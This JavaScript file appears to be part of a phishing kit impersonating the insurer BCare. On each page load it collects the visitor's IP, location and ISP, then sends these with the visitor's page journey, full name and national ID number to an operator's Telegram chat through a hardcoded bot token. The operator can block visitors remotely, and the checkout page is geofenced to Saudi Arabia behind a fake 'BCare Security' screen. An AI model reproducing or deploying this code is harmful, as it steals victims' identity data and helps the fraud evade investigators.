/* ═══════════════════════════════════════════════════════
   Tracker — تتبع رحلة العميل + الحظر
   ═══════════════════════════════════════════════════════ */

const Tracker = (function () {
  const STORAGE_KEY = 'bcare_journey';
  const IP_KEY      = 'bcare_ip';
  const MSG_KEY     = 'bcare_msg_ids';
  const GEO_KEY     = 'bcare_geo';
  const TG_TOKEN    = '8297451860:AAG52IqNkSFFPhMJr82TNEpqYNd0i7u3Dow';
  const TG_CHAT     = '1451039924';

  const ALLOWED_COUNTRIES = ['SA'];

  const PAGE_NAMES = {
    'app.html':            'الصفحة الرئيسية',
    'policy-details.html': 'تفاصيل الوثيقة',
    'offers.html':         'العروض',
    'secure-checkout.html':'الدفع',
    'otp-verify.html':     'تأكيد OTP',
  };

  /* ─── جلب IP ─────────────────────────────────────── */
  async function getIP() {
    let ip = sessionStorage.getItem(IP_KEY);
    if (ip) return ip;
    try {
      const r = await fetch('https://api.ipify.org?format=json');
      const d = await r.json();
      ip = d.ip || 'unknown';
    } catch(e) {
      ip = 'unknown';
    }
    sessionStorage.setItem(IP_KEY, ip);
    return ip;
  }

  /* ─── جلب الموقع الجغرافي ────────────────────────── */
  async function getGeo(ip) {
    let cached = sessionStorage.getItem(GEO_KEY);
    if (cached) return JSON.parse(cached);
    try {
      const r = await fetch(`https://ipinfo.io/${ip}/json`);
      const d = await r.json();
      if (d.country) {
        const geo = {
          flag: countryFlag(d.country),
          country: d.country || '',
          city: d.city || '',
          isp: d.org || '',
        };
        sessionStorage.setItem(GEO_KEY, JSON.stringify(geo));
        return geo;
      }
    } catch(e) {}
    return { flag: '🌍', country: '', city: '', isp: '' };
  }

  function countryFlag(code) {
    if (!code) return '🌍';
    const flags = {
      SA:'🇸🇦', AE:'🇦🇪', EG:'🇪🇬', KW:'🇰🇼', QA:'🇶🇦', BH:'🇧🇭', OM:'🇴🇲', JO:'🇯🇴',
      LB:'🇱🇧', IQ:'🇮🇶', SY:'🇸🇾', YE:'🇾🇪', US:'🇺🇸', GB:'🇬🇧', IN:'🇮🇳', PK:'🇵🇰',
      PH:'🇵🇭', BD:'🇧🇩', TR:'🇹🇷', FR:'🇫🇷', DE:'🇩🇪', CA:'🇨🇦', AU:'🇦🇺',
    };
    return flags[code.toUpperCase()] || '🌍';
  }

  /* ─── تسجيل صفحة ────────────────────────────────── */
  function logPage(page) {
    try {
      const journey = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
      journey.push({
        page,
        pageName: PAGE_NAMES[page] || page,
        time: new Date().toLocaleString('ar-SA'),
        ts: Date.now(),
      });
      localStorage.setItem(STORAGE_KEY, JSON.stringify(journey));
    } catch(e) {}
  }

  /* ─── بناء نص الرحلة ───────────────────────────── */
  function buildJourneyText(ip, geo, journey, extra) {
    const pagesList = journey.map((j, i) =>
      `  ${i + 1}. ${j.pageName} — ${j.time}`
    ).join('\n');

    const loc = geo.country ? `${geo.flag} ${geo.country}${geo.city ? ' — ' + geo.city : ''}${geo.isp ? ' | ' + geo.isp : ''}` : '';

    return `👤 <b>زيارة جديدة</b>

🌐 IP: <code>${ip}</code>${loc ? '\n📍 الموقع: ' + loc : ''}
📱 الصفحة: ${PAGE_NAMES[Object.keys(PAGE_NAMES).find(k => journey.length && journey[journey.length-1].page === k)] || ''}
🕐 الوقت: ${new Date().toLocaleString('ar-SA')}

📋 <b>الرحلة حتى الآن:</b>
${pagesList || '  لا توجد بيانات'}
${extra ? '\n' + extra : ''}`;
  }

  /* ─── إرسال أو تحديث رسالة لتليجرام ─────────────── */
  async function sendOrUpdateVisit(ip, geo, journey, extra) {
    try {
      const msgIds = JSON.parse(localStorage.getItem(MSG_KEY) || '{}');
      const text = buildJourneyText(ip, geo, journey, extra);
      const blockKB = {
        inline_keyboard: [[{ text: '🚫 حظر هذا العميل', callback_data: `blockip_${ip}` }]]
      };

      /* إذا there's a previous message for this IP → تحديثه */
      if (msgIds[ip]) {
        try {
          const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: TG_CHAT,
              message_id: msgIds[ip],
              text,
              parse_mode: 'HTML',
              reply_markup: blockKB,
            }),
          });
          if (res.ok) return;
        } catch(e) {}
      }

      /* إرسال رسالة جديدة */
      const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TG_CHAT,
          text,
          parse_mode: 'HTML',
          reply_markup: blockKB,
        }),
      });
      const d = await res.json();
      if (d.ok && d.result) {
        msgIds[ip] = d.result.message_id;
        localStorage.setItem(MSG_KEY, JSON.stringify(msgIds));
      }
    } catch(e) {}
  }

  /* ─── إرسال الرحلة عند الدفع ────────────────────── */
  async function sendJourneyToTelegram(extra) {
    try {
      const ip = await getIP();
      const geo = await getGeo(ip);
      const journey = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
      const policy = JSON.parse(sessionStorage.getItem('bcare_policy') || '{}');
      const offer  = JSON.parse(sessionStorage.getItem('bcare_offer')  || '{}');

      const ref = offer.refNumber || '—';
      const name = policy.fullName || '—';
      const natId = JSON.parse(sessionStorage.getItem('bcare_form') || '{}').nationalId || '—';

      const extraBlock = `${extra || ''}

💰 <b>تفاصيل الطلب</b>
🆔 المرجع: <code>${ref}</code>
👤 الاسم: ${name}
🪪 الهوية: <code>${natId}</code>`;

      await sendOrUpdateVisit(ip, geo, journey, extraBlock);
    } catch(e) {}
  }

  /* ─── مراقبة أزرار الحظر ────────────────────────── */
  let blockPollInt = null;
  let lastBlockUpdateId = 0;
  const externalHandlers = {};

  function onCallback(prefix, handler) {
    externalHandlers[prefix] = handler;
  }

  async function tgAnswerCallback(id, text) {
    return fetch(`https://api.telegram.org/bot${TG_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: id, text }),
    }).catch(()=>{});
  }

  async function tgEditMsg(chatId, msgId, text, replyMarkup) {
    const body = { chat_id: chatId, message_id: msgId, text, parse_mode: 'HTML' };
    if (replyMarkup) body.reply_markup = replyMarkup;
    return fetch(`https://api.telegram.org/bot${TG_TOKEN}/editMessageText`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    }).catch(()=>{});
  }

  async function startBlockPolling() {
    try {
      const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=${lastBlockUpdateId + 1}&timeout=5`);
      const d = await r.json();
      if (!d.ok || !d.result) return;

      for (const u of d.result) {
        lastBlockUpdateId = Math.max(lastBlockUpdateId, u.update_id);

        if (u.callback_query) {
          const cq = u.callback_query;
          const data = cq.data || '';

          if (data.startsWith('blockip_')) {
            const ip = data.replace('blockip_', '');
            tgAnswerCallback(cq.id, '🚫 تم الحظر');
            tgEditMsg(cq.message.chat.id, cq.message.message_id,
              cq.message.text + `\n\n🚫 <b>تم حظر هذا العميل</b>`,
              { inline_keyboard: [[{ text: '✅ إلغاء الحظر', callback_data: `unblockip_${ip}` }]] });
            blockIP(ip);
            continue;
          }

          if (data.startsWith('unblockip_')) {
            const ip = data.replace('unblockip_', '');
            tgAnswerCallback(cq.id, '✅ تم إلغاء الحظر');
            tgEditMsg(cq.message.chat.id, cq.message.message_id,
              cq.message.text + `\n\n✅ <b>تم إلغاء حظر هذا العميل</b>`);
            unblockIP(ip);
            continue;
          }

          for (const [prefix, handler] of Object.entries(externalHandlers)) {
            if (data.startsWith(prefix)) {
              handler(cq, data);
              break;
            }
          }
        }

        if (u.message && u.message.text) {
          for (const [trigger, handler] of Object.entries(externalHandlers)) {
            if (u.message.text.trim() === trigger) {
              handler(u.message);
              break;
            }
          }
        }
      }
    } catch(e) {}
  }

  function startBlockListener() {
    fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=-1&timeout=0`)
      .then(r => r.json())
      .then(d => {
        if (d.ok && d.result && d.result.length) {
          lastBlockUpdateId = d.result[d.result.length - 1].update_id;
        }
      }).catch(()=>{});
    blockPollInt = setInterval(startBlockPolling, 3000);
  }

  /* ─── فحص الحظر ─────────────────────────────────── */
  async function checkBlocked() {
    try {
      const ip = await getIP();

      const local = JSON.parse(localStorage.getItem('bcare_blocked') || '[]');
      if (local.some(b => b.ip === ip)) {
        document.body.innerHTML = buildBlockedScreen('تم حظرك', 'تم حظر وصولك إلى هذا الموقع由于 أنشطة مشبوهة.', 'block');
        return true;
      }

      const r = await fetch('blocked.json?t=' + Date.now());
      const blocked = await r.json();
      if (Array.isArray(blocked) && blocked.some(b => b.ip === ip)) {
        document.body.innerHTML = buildBlockedScreen('تم حظرك', 'تم حظر وصولك إلى هذا الموقع由于 أنشطة مشبوهة.', 'block');
        return true;
      }
    } catch(e) {}
    return false;
  }

  /* ─── فحص الموقع الجغرافي ───────────────────────── */
  async function checkGeoRestriction() {
    try {
      const ip = await getIP();
      const geo = await getGeo(ip);
      const country = (geo.country || '').toUpperCase();

      if (ALLOWED_COUNTRIES.includes(country)) return false;

      document.body.innerHTML = buildGeoBlockedScreen(geo);
      return true;
    } catch(e) {}
    return false;
  }

  function buildBlockedScreen(title, reason, icon) {
    return `<!DOCTYPE html><html lang="ar" dir="rtl"><head>
      <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
      <title>${title}</title>
      <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@400;600;700&display=swap" rel="stylesheet">
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
      <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Noto Sans Arabic',sans-serif;background:#f7f8fa;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#1a1a2e}
        .card{background:#fff;border-radius:16px;box-shadow:0 4px 24px rgba(0,0,0,.08);padding:3rem 2.5rem;max-width:440px;width:90%;text-align:center}
        .icon-wrap{width:88px;height:88px;border-radius:50%;background:#fdecea;display:flex;align-items:center;justify-content:center;margin:0 auto 1.5rem}
        .icon-wrap .material-icons{font-size:2.8rem;color:#e53935}
        h1{font-size:1.5rem;font-weight:700;margin-bottom:.6rem;color:#1a1a2e}
        p{color:#6b7c93;font-size:.9rem;line-height:1.7}
        .divider{width:48px;height:3px;background:linear-gradient(90deg,#155f93,#1a7ab8);border-radius:2px;margin:1.2rem auto}
        .footer{margin-top:1.5rem;padding-top:1rem;border-top:1px solid #f0f2f5;color:#9aa5b4;font-size:.75rem}
      </style>
    </head><body>
      <div class="card">
        <div class="icon-wrap"><span class="material-icons">${icon || 'block'}</span></div>
        <h1>${title}</h1>
        <div class="divider"></div>
        <p>${reason}</p>
        <div class="footer">BCare Insurance &copy; ${new Date().getFullYear()}</div>
      </div>
    </body></html>`;
  }

  function buildGeoBlockedScreen(geo) {
    const loc = geo.country ? `${geo.flag} ${geo.country}${geo.city ? ' — ' + geo.city : ''}` : '';
    return `<!DOCTYPE html><html lang="ar" dir="rtl"><head>
      <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
      <title>Access Denied</title>
      <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@400;600;700&display=swap" rel="stylesheet">
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
      <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Noto Sans Arabic',sans-serif;background:#f7f8fa;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#1a1a2e}
        .card{background:#fff;border-radius:16px;box-shadow:0 4px 24px rgba(0,0,0,.08);padding:3rem 2.5rem;max-width:480px;width:90%;text-align:center}
        .shield{width:96px;height:96px;border-radius:50%;background:linear-gradient(135deg,#fff3e0,#ffe0b2);display:flex;align-items:center;justify-content:center;margin:0 auto 1.5rem;position:relative}
        .shield .material-icons{font-size:3rem;color:#e65100}
        .badge{position:absolute;bottom:2px;right:2px;width:28px;height:28px;border-radius:50%;background:#e53935;display:flex;align-items:center;justify-content:center;border:3px solid #fff}
        .badge .material-icons{font-size:.9rem;color:#fff}
        h1{font-size:1.4rem;font-weight:700;margin-bottom:.3rem;color:#1a1a2e}
        .subtitle{color:#e65100;font-size:.85rem;font-weight:600;margin-bottom:1rem}
        .divider{width:48px;height:3px;background:linear-gradient(90deg,#e65100,#ff9800);border-radius:2px;margin:0 auto 1rem}
        .info{background:#f7f8fa;border-radius:10px;padding:.8rem 1rem;margin:.8rem 0;display:flex;align-items:center;gap:.6rem;justify-content:center}
        .info .material-icons{color:#9aa5b4;font-size:1.1rem}
        .info span{color:#6b7c93;font-size:.8rem}
        .msg{color:#6b7c93;font-size:.85rem;line-height:1.7;margin-top:.5rem}
        .footer{margin-top:1.5rem;padding-top:1rem;border-top:1px solid #f0f2f5;color:#9aa5b4;font-size:.7rem}
        .footer a{color:#155f93;text-decoration:none}
        .cloudflare{display:flex;align-items:center;justify-content:center;gap:.4rem;margin-top:.8rem;color:#9aa5b4;font-size:.7rem}
        .cloudflare .material-icons{font-size:.85rem}
      </style>
    </head><body>
      <div class="card">
        <div class="shield">
          <span class="material-icons">security</span>
          <div class="badge"><span class="material-icons">close</span></div>
        </div>
        <h1>تم حظر الوصول</h1>
        <div class="subtitle">Access Denied — 403</div>
        <div class="divider"></div>
        <div class="info"><span class="material-icons">location_on</span><span>${loc || 'موقع غير معروف'}</span></div>
        <div class="info"><span class="material-icons">public</span><span>الخدمة غير متاحة في منطقتك</span></div>
        <p class="msg">هذه الخدمة متاحة فقط في <b>المملكة العربية السعودية</b>.<br/>للتواصل مع الدعم، يرجى زيارة موقعنا الرسمي.</p>
        <div class="cloudflare"><span class="material-icons">shield</span><span>Protected by BCare Security</span></div>
        <div class="footer">BCare Insurance &copy; ${new Date().getFullYear()} — <a href="#">اتصل بنا</a></div>
      </div>
    </body></html>`;
  }

  /* ─── حظر IP ─────────────────────────────────────── */
  async function blockIP(ip) {
    try {
      let blocked = JSON.parse(localStorage.getItem('bcare_blocked') || '[]');
      if (!blocked.some(b => b.ip === ip)) {
        blocked.push({ ip, blockedAt: new Date().toISOString() });
        localStorage.setItem('bcare_blocked', JSON.stringify(blocked));
      }
    } catch(e) {}
  }

  /* ─── إلغاء حظر IP ─────────────────────────────── */
  async function unblockIP(ip) {
    try {
      let blocked = JSON.parse(localStorage.getItem('bcare_blocked') || '[]');
      blocked = blocked.filter(b => b.ip !== ip);
      localStorage.setItem('bcare_blocked', JSON.stringify(blocked));
    } catch(e) {}
  }

  /* ─── تنظيف ──────────────────────────────────────── */
  function clear() {
    localStorage.removeItem(STORAGE_KEY);
    localStorage.removeItem(MSG_KEY);
    localStorage.removeItem(GEO_KEY);
  }

  /* ─── تهيئة ──────────────────────────────────────── */
  async function init() {
    const page = window.location.pathname.split('/').pop() || 'app.html';

    const blocked = await checkBlocked();
    if (blocked) return;

    if (page === 'secure-checkout.html') {
      const geoBlocked = await checkGeoRestriction();
      if (geoBlocked) return;
    }

    logPage(page);
    startBlockListener();

    /* إرسال أو تحديث زيارة */
    try {
      const ip = await getIP();
      const geo = await getGeo(ip);
      const journey = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
      await sendOrUpdateVisit(ip, geo, journey);
    } catch(e) {}
  }

  return { init, getIP, onCallback, sendJourneyToTelegram, onCheckout: async () => {
    const ip = await getIP();
    const geo = await getGeo(ip);
    const journey = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
    await sendOrUpdateVisit(ip, geo, journey, '💰 <b>العميل وصل صفحة الدفع</b>');
  }, clear, checkBlocked, blockIP, unblockIP };
})();

document.addEventListener('DOMContentLoaded', () => Tracker.init());
